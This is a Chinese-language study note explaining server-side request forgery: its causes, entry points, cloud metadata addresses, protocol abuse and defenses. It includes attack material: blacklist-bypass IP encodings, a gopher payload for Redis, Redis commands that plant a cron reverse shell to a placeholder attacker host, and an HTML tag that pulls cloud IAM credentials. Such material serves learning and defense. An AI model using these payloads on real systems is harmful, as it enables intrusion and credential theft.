---
tags: [security, web-security, ssrf, attack-surface]
created: 2026-06-27
source: conversation
---

# SSRF 攻击深度解析

> SSRF（Server-Side Request Forgery，服务端请求伪造）：攻击者诱导服务端向非预期目标发起请求，从而绕过网络边界防护。

**一句话概括核心矛盾：服务器代替你访问了它本不该访问的东西。**

## 底层原理

SSRF 的根因在于**信任模型的错位**：

```
客户端 ──请求──▶ 服务器 ──转发请求──▶ 内部资源
                        ↑
                   这段转发链路中，
                   服务器「信任」了用户提供的目标地址
```

服务器处于特权网络位置——能访问内网数据库、云元数据服务、内部 API。当攻击者可以控制服务器「去哪里请求」时，就借用服务器的身份穿越了网络边界。

## 攻击入口

任何允许用户指定 URL 并让服务端去请求的功能点：

| 功能场景 | 示例 |
|---|---|
| 网页转图片/PDF | `?url=https://evil.com` |
| 远程资源加载 | 图片代理、文件上传 URL |
| Webhook 回调 | 用户自定义回调地址 |
| API 聚合 | 服务端转发请求到第三方 |
| 文件导入 | 从 URL 导入数据 |

## 攻击面分类

### 按目标分类

**① 访问内网资源**
- 数据库（Redis、MySQL、MongoDB 无认证）
- 内部管理面板
- 内网微服务 API

**② 云环境元数据窃取**

| 云平台 | 元数据地址 |
|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| 阿里云 | `http://100.100.100.200/latest/meta-data/` |
| 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/` |

这是云环境中最致命的利用——拿到临时凭证即获得实例的云 API 权限。

**③ 端口扫描**
- 通过响应时间差异探测内网服务是否开放

**④ 协议利用**

| 协议 | 利用方式 |
|---|---|
| `file://` | 读取本地文件 `/etc/passwd` |
| `gopher://` | 构造原始 TCP 数据，攻击 Redis/MySQL |
| `dict://` | 端口探测、Redis 命令执行 |
| `ftp://` | FTP 暴力破解、内网扫描 |

### 按回显分类

| 类型 | 特征 | 利用难度 |
|---|---|---|
| Basic SSRF | 响应直接返回给攻击者 | 低 |
| Blind SSRF | 请求发出但无回显 | 高，需带外通道（DNS/HTTP log）验证 |

## 核心利用技术

### 绕过黑名单

```
127.0.0.1 → 0177.0.0.1（八进制）
127.0.0.1 → 0x7f.0x0.0x0.0x1（十六进制）
127.0.0.1 → 2130706433（十进制 IP）
127.0.0.1 → 0x7f000001（十六进制整数）
localhost → localhost%00.example.com（空字节截断）
127.0.0.1 → 127.0.0.1.nip.io（DNS 解析到 127.0.0.1）
169.254.169.254 → http://[::ffff:a9fe:a9fe]/（IPv6 映射）
```

### URL 解析器不一致

不同库对 URL 的解析差异是重要利用点：

```
http://evil.com@127.0.0.1/   → 有些库认为是 127.0.0.1
http://127.0.0.1#@evil.com/  → 有些库认为是 evil.com
http://127.0.0.1:80@evil.com/ → 歧义：认证信息 vs 实际目标
```

### 302 重定向绕过

```
1. 白名单检查通过: http://safe-domain.com/resource
2. 目标返回 302 → http://169.254.169.254/
3. HTTP 客户端自动跟随重定向
4. 绕过成功
```

## 进阶利用案例

### Gopher 协议攻击内网 Redis

Redis 协议是纯文本的，可通过 Gopher 在 TCP 层面构造命令：

```
gopher://192.168.1.100:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0akey1%0d%0a$5%0d%0avalue%0d%0a
```

更危险的利用——写 crontab 反弹 shell：

```
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET payload "\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/port 0>&1\n"
SAVE
```

### PDF 生成器 SSRF

HTML→PDF 服务（如 wkhtmltopdf）渲染页面时会请求嵌入的资源：

```html
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

凭证信息直接嵌入生成的 PDF 中。

## 防御体系

### 根本原则

**永远不要信任用户提供的 URL。**

### 分层防御

| 层级 | 措施 | 效果 |
|---|---|---|
| 应用层 | URL 白名单（而非黑名单） | ★★★★★ |
| 网络层 | 服务实例禁止访问元数据服务（iptables） | ★★★★★ |
| 传输层 | 禁用不必要协议（仅允许 HTTP/HTTPS） | ★★★★ |
| 解析层 | 统一 DNS 解析后检查 IP 段 | ★★★★ |
| 架构层 | 将外发请求放到独立沙箱/代理中执行 | ★★★★ |

### 具体实现要点

1. **白名单优先**：只允许请求已知的外部域名
2. **解析后再校验**：DNS 解析 URL → 检查 IP 是否私有/保留地址
3. **禁止跳转**：禁用 HTTP 重定向跟随，或对每次跳转重新校验
